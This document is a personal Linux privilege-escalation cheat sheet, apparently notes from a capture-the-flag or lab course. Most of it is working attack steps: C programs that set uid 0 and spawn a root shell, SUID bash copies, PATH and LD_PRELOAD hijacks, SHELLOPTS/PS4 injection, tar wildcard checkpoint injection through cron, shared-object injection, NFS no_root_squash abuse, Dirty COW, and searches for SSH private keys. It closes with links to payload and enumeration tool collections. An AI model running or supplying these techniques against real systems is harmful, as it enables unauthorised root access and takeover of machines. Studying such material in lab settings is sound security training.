# Check id
id

# check default value sudo
su root
password root

# check who are you
whoami
# check ssh, id_rsa, authorized_hosts
in case have authorized_host value -> refer to moneybox Playground

# GROUP
belong to docker, lxd
# Check all the file you can read
ls -arh

# check weak file permission
ls -la /etc/shadow

# Check ssh key 
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
can search for the pattern

# find suid file
find / -perm -u=\s -type f 2>/dev/null
after saving the suid go through all the lib with gtfbin.io
#### symlink with nginx cve-2016 https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#### SUID with env 
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

Exploitation

Linux VM

1. In command prompt type:
``` echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c ```
2. In command prompt type: gcc /tmp/service.c -o /tmp/service
3. In command prompt type: export PATH=/tmp:$PATH
4. In command prompt type: /usr/local/bin/suid-env
5. In command prompt type: id

#### SUID with ENV2
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env2
4. From the output, notice the functions used by the binary.

Exploitation Method #1

Linux VM

1. In command prompt type:
``` function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; } ```
2. In command prompt type:
``` export -f /usr/sbin/service ```
3. In command prompt type: /usr/local/bin/suid-env2

Exploitation Method #2

Linux VM

1. In command prompt type:
```env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p' ```

# capicity
Detection

Linux VM

1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

Linux VM

1. In command prompt type:
```/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")' ```



# cronjob
# check all the posibble.
crontab -l 
cat /etc/crontab

#### with the path
Detection

Linux VM

1. In command prompt type: cat /etc/crontab
2. From the output, notice the value of the “PATH” variable.

Exploitation

Linux VM

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
2. In command prompt type: chmod +x /home/user/overwrite.sh
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: /tmp/bash -p
5. In command prompt type: id

#### with the wirldcard

Detection

Linux VM

1. In command prompt type: cat /etc/crontab
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: cat /usr/local/bin/compress.sh
4. From the output, notice the wildcard (*) used by ‘tar’.

Exploitation

Linux VM

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: /tmp/bash -p
6. In command prompt type: id
7. 

# kernel exploit
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

chmod +x les.sh

# dirty cow
https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
gcc -pthread cow.c -o cow
./cow

# LD_PRELOAD on the enviroment
Linux VM

1. In command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

``` Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
```

Exploitation

1. Open a text editor and type:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id

# SUID sharing object injection
Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Exploitation

Linux VM

Note that the folder should be writable 
5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id

# NFS no root sqash
Detection

Linux VM

1. In command line type: cat /etc/exports
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

Exploitation

Attacker VM

1. Open command prompt and type: showmount -e 10.10.48.103
2. In command prompt type: mkdir /tmp/1
3. In command prompt type: mount -o rw,vers=2 10.10.48.103:/tmp /tmp/1
In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
5. In command prompt type: chmod +s /tmp/1/x

Linux VM

1. In command prompt type: /tmp/x
2. In command prompt type: id

#  sudo
sudo -l -l 
check if it can run any sudo with group
https://then3wadm1n.wordpress.com/2020/11/27/03-write-up-chill-hack/

# Check process

pspy 

# all script

General:

https://github.com/swisskyrepo/PayloadsAllTheThings (A bunch of tools and payloads for every stage of pentesting)



Linux:

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (a bit old but still worth looking at)

https://github.com/rebootuser/LinEnum (One of the most popular priv esc scripts)

https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh (Another popular script)

https://github.com/mzet-/linux-exploit-suggester (A Script that's dedicated to searching for kernel exploits)



https://gtfobins.github.io (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)



Windows:



https://www.fuzzysecurity.com/tutorials/16.html  (Dictates some very useful commands and methods to enumerate the host and gain intel)



https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp (A bit old but still an incredibly useful script)



https://github.com/411Hall/JAWS (A general enumeration script)
